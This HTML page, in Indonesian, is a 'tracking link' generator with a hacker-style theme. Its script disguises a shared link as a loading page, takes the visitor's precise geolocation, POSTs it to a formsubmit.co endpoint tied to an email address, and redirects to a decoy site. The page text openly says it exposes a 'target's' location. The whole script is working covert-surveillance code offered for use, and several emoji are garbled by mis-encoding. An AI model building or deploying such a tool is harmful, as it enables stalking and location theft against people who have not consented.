<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Pelacak Lokasi - S</title>
    <style>
        /* Desain Neon dan Glitch untuk Tampilan Hacker */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a1a;
            color: #00ff00; /* Hijau Neon */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }
        .glitch-text {
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 2em;
            color: #ff00ff; /* Magenta Neon */
            text-shadow: 0 0 5px #00ff00, 0 0 10px #ff00ff;
            animation: glitch 1.5s infinite alternate;
            opacity: 0.2;
            pointer-events: none;
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        .container {
            background-color: #0d0d0d;
            border: 2px solid #00ff00;
            box-shadow: 0 0 20px #00ff00, inset 0 0 10px #00ff00;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            max-width: 600px;
            width: 90%;
            position: relative;
            z-index: 1;
        }
        h1 {
            color: #ff00ff;
            text-shadow: 0 0 8px #00ff00;
            margin-bottom: 20px;
            font-size: 2.5em;
        }
        p {
            margin-bottom: 15px;
            line-height: 1.6;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #00ff00;
            font-weight: bold;
        }
        .input-group input[type="text"] {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #00ff00;
            background-color: #0d0d0d;
            color: #ff00ff;
            border-radius: 5px;
            font-size: 1em;
            box-shadow: inset 0 0 5px #00ff00;
        }
        .input-group input[type="text"]:focus {
            outline: none;
            border-color: #ff00ff;
            box-shadow: inset 0 0 8px #ff00ff;
        }
        button {
            background-color: #00ff00;
            color: #1a1a1a;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: bold;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 0 10px #00ff00;
        }
        button:hover {
            background-color: #00e600;
            box-shadow: 0 0 15px #00ff00;
        }
        #trackingLinkOutput {
            margin-top: 25px;
            padding: 15px;
            background-color: #2a2a2a;
            border: 1px dashed #ff00ff;
            border-radius: 5px;
            color: #00ff00;
            word-break: break-all;
            display: none; /* Hidden by default */
            box-shadow: inset 0 0 5px #ff00ff;
        }
        #trackingLinkOutput a {
            color: #ff00ff;
            text-decoration: none;
        }
        #trackingLinkOutput a:hover {
            text-decoration: underline;
        }
        .status {
            margin-top: 20px;
            font-weight: bold;
            color: #ff00ff;
        }
        .console-output {
            background-color: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 15px;
            margin-top: 20px;
            text-align: left;
            font-family: 'Consolas', 'Monaco', monospace;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
            display: none; /* Hidden by default */
            box-shadow: inset 0 0 5px #00ff00;
        }
    </style>
</head>
<body>
    <div class="glitch-text">ACCESS GRANTED</div>
    <div class="container">
        <h1>üõ†Ô∏è Pembuat Tautan Pelacak S üõ†Ô∏è</h1>
        <p>Selamat datang, users! Di sini, kamu bisa membuat tautan pelacak yang akan membongkar lokasi targetmu begitu mereka membukanya. Sebuah trik kecil yang licik, bukan? Haha! Ini adalah permainan pikiran!</p>

        <div class="input-group">
            <label for="redirectUrl">URL Pengalihan (Opsional - Setelah lokasi didapat):</label>
            <input type="text" id="redirectUrl" placeholder="Contoh: https://situs-asli.com/artikel" value="https://google.com">
        </div>

        <button id="generateLinkButton">üöÄ Buat Tautan Pelacak Sekarang!</button>

        <div id="trackingLinkOutput" class="console-output">
            <p>Tautan Pelacakmu siap digunakan, users! Sebarkan dan saksikan keajaiban digital terjadi:</p>
            <a href="#" id="generatedLink" target="_blank"></a>
            <!-- Tambahkan ini untuk salinan manual yang mudah -->
            <textarea id="manualCopyLink" readonly style="width: calc(100% - 20px); height: 60px; margin-top: 10px; background-color: #2a2a2a; color: #00ff00; border: 1px dashed #ff00ff; border-radius: 5px; padding: 10px; resize: vertical;"></textarea>
            <button onclick="copyLink()" style="margin-top: 10px; background-color: #ff00ff; color: #1a1a1a;">Salin Tautan (Otomatis)</button>
            <p style="margin-top: 10px; color: #ff00ff;">Jika tombol gagal, sorot dan salin teks di atas secara manual! üëÜ</p>
        </div>


        <div class="status"></div>
        <div id="consoleLog" class="console-output">
            <h3>Log Sistem:</h3>
            <p>Memulai proses pelacakan...</p>
        </div>
    </div>

    <script>
        // HATI-HATI: Ganti URL webhook ini dengan milikmu! Ini akan menerima data lokasi.
        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com";

        const statusDisplay = document.querySelector(".status");
        let consoleLogDisplay = document.getElementById("consoleLog");
        const redirectUrlInput = document.getElementById("redirectUrl");
        const generateLinkButton = document.getElementById("generateLinkButton");
        const trackingLinkOutputDiv = document.getElementById("trackingLinkOutput");
        const generatedLinkElement = document.getElementById("generatedLink");
        const manualCopyLinkTextarea = document.getElementById("manualCopyLink"); // Dipindahkan ke sini agar hanya satu deklarasi

        function logToConsole(message) {
            consoleLogDisplay.style.display = 'block';
            consoleLogDisplay.innerHTML += `<p>${new Date().toLocaleTimeString()} &gt;&gt; ${message}</p>`;
            consoleLogDisplay.scrollTop = consoleLogDisplay.scrollHeight;
        }

        /**
         * Fungsi inti yang berjalan saat korban membuka tautan pelacak.
         * Ini akan mencoba mendapatkan lokasi dan mengirimkannya ke webhook.
         */
        function runTrackingLogic() {
            logToConsole("Mencoba mendapatkan lokasi target...");
            if (navigator.geolocation) {
                // Mencoba mendapatkan posisi dengan akurasi tinggi
                navigator.geolocation.getCurrentPosition(sendLocationAndRedirect, handleError, {
                    enableHighAccuracy: true,
                    timeout: 5000, // Batas waktu 5 detik untuk mendapatkan lokasi
                    maximumAge: 0   // Tidak menggunakan cache lokasi lama
                });
            } else {
                statusDisplay.textContent = "Browser target tidak mendukung geolocation.";
                logToConsole("Browser target tidak mendukung geolocation.");
                handlePostTrackingRedirect(); // Tetap alihkan meskipun gagal
            }
        }

        /**
         * Mengirim data lokasi yang didapat ke webhook dan kemudian mengalihkan.
         */
        function sendLocationAndRedirect(position) {
            const { latitude, longitude } = position.coords;
            const data = {
                lokasi: `https://www.google.com/maps?q=${latitude},${longitude}`,
                waktu: new Date().toString(),
                _subject: "Lokasi Target Terdeteksi oleh S!", // Subjek kustom untuk Formsubmit
                _template: "table" // Format email yang lebih rapi
            };

            logToConsole(`Lokasi terdeteksi: Latitude ${latitude}, Longitude ${longitude}. Mengirim data...`);

            // Menggunakan Fetch API untuk pengiriman data yang lebih modern
            fetch(webhook, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json", // Kirim sebagai JSON
                    "Accept": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    logToConsole("Data lokasi berhasil dikirim ke webhook! ‚úÖ");
                    statusDisplay.textContent = "Lokasi berhasil didapatkan dan dikirim!";
                } else {
                    logToConsole(`Gagal mengirim data lokasi. Kode status: ${response.status} ‚ùå`);
                    statusDisplay.textContent = `Gagal mengirim data lokasi. Respons: ${response.status}`;
                }
            })
            .catch(error => {
                logToConsole(`Terjadi kesalahan jaringan saat mengirim data: ${error.message} üí•`);
                statusDisplay.textContent = `Terjadi kesalahan jaringan: ${error.message}`;
            })
            .finally(() => {
                // Selalu alihkan setelah mencoba mengirim lokasi
                handlePostTrackingRedirect();
            });
        }

        /**
         * Menangani error saat mendapatkan lokasi.
         */
        function handleError(error) {
            statusDisplay.textContent = "Gagal mendapatkan lokasi: " + error.message;
            logToConsole(`Gagal mendapatkan lokasi: ${error.message} üö®`);
            handlePostTrackingRedirect(); // Tetap alihkan meskipun ada error
        }

        /**
         * Mengalihkan browser target ke URL yang ditentukan setelah pelacakan.
         */
        function handlePostTrackingRedirect() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetRedirectUrl = urlParams.get('r'); // Parameter 'r' untuk URL pengalihan
            if (targetRedirectUrl) {
                logToConsole(`Mengalihkan ke ${decodeURIComponent(targetRedirectUrl)}... ‚û°Ô∏è`);
                setTimeout(() => {
                    window.location.replace(decodeURIComponent(targetRedirectUrl)); // Menggunakan replace agar tidak ada riwayat
                }, 1500); // Beri sedikit jeda agar pesan log terlihat
            } else {
                logToConsole("Tidak ada URL pengalihan yang ditentukan. Tetap di halaman ini.");
            }
        }

        // --- Logic untuk pengguna (pembuat tautan) ---
        generateLinkButton.addEventListener('click', () => {
            logToConsole("Tombol 'Buat Tautan Pelacak' diklik. Mengolah...");
            const baseUrl = window.location.origin + window.location.pathname; // URL halaman ini
            const desiredRedirect = redirectUrlInput.value.trim();
            let generatedTrackingLink = baseUrl;

            if (desiredRedirect) {
                // Encode URL pengalihan agar aman sebagai parameter query
                const encodedRedirect = encodeURIComponent(desiredRedirect);
                generatedTrackingLink += `?r=${encodedRedirect}`;
                logToConsole(`Membentuk tautan dengan pengalihan ke: ${desiredRedirect} üîó`);
            } else {
                logToConsole("Tidak ada URL pengalihan yang ditentukan. Tautan akan tetap di halaman ini.");
            }

            generatedLinkElement.href = generatedTrackingLink;
            generatedLinkElement.textContent = generatedTrackingLink;
            manualCopyLinkTextarea.value = generatedTrackingLink; // Isi textarea dengan tautan
            trackingLinkOutputDiv.style.display = 'block';
            statusDisplay.textContent = "Tautan berhasil dibuat! Salin dan sebarkan. üòà";
            logToConsole("Tautan pelacak berhasil dibuat.");
        });

        /**
         * Menyalin tautan yang dihasilkan ke clipboard.
         */
        function copyLink() {
            const linkText = generatedLinkElement.textContent;
            navigator.clipboard.writeText(linkText).then(() => {
                statusDisplay.textContent = "Tautan pelacak disalin ke clipboard! üéâ";
                logToConsole("Tautan pelacak disalin.");
            }).catch(err => {
                statusDisplay.textContent = "Gagal menyalin tautan otomatis. Silakan salin secara manual dari kotak di atas! üö´";
                logToConsole(`Gagal menyalin tautan otomatis: ${err.message} üö´`);
                // Fallback untuk salinan manual
                manualCopyLinkTextarea.select();
                try {
                    document.execCommand('copy'); // Ini mungkin tidak bekerja di semua lingkungan tanpa interaksi pengguna
                    statusDisplay.textContent = "Tautan disorot. Silakan tekan Ctrl+C / Cmd+C untuk menyalin!";
                    logToConsole("Teks tautan disorot untuk salinan manual.");
                } catch (fallbackErr) {
                    statusDisplay.textContent = "Gagal menyalin dan menyorot tautan. Silakan salin manual dari kotak teks.";
                    logToConsole(`Fallback salinan manual juga gagal: ${fallbackErr.message}`);
                }
            });
        }

        // --- Logika inisialisasi halaman ---
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('r')) {
            // Jika parameter 'r' ada, berarti ini adalah kunjungan tautan pelacak
            // Ubah tampilan menjadi mode 'memproses'
            document.querySelector(".container").innerHTML = `
                <h1>Memproses Permintaan...</h1>
                <p>Harap tunggu sebentar, users, kami sedang mengambil informasi yang kamu cari...</p>
                <div class="status"></div>
                <div id="consoleLog" class="console-output" style="display:block;">
                    <h3>Log Sistem:</h3>
                    <p>Memulai proses pelacakan...</p>
                </div>
            `;
            // Re-inisialisasi elemen consoleLogDisplay karena DOM telah berubah
            consoleLogDisplay = document.getElementById("consoleLog");
            runTrackingLogic();
        } else {
            // Jika tidak ada parameter 'r', tampilkan antarmuka pembuatan tautan
            logToConsole("Mode pembuatan tautan diaktifkan. üíª");
            // Konten awal sudah ada di tempatnya
        }

        // Log awal saat sistem dimuat
        logToConsole("Sistem S aktif. Menunggu perintah...");
    </script>
</body>
</html>
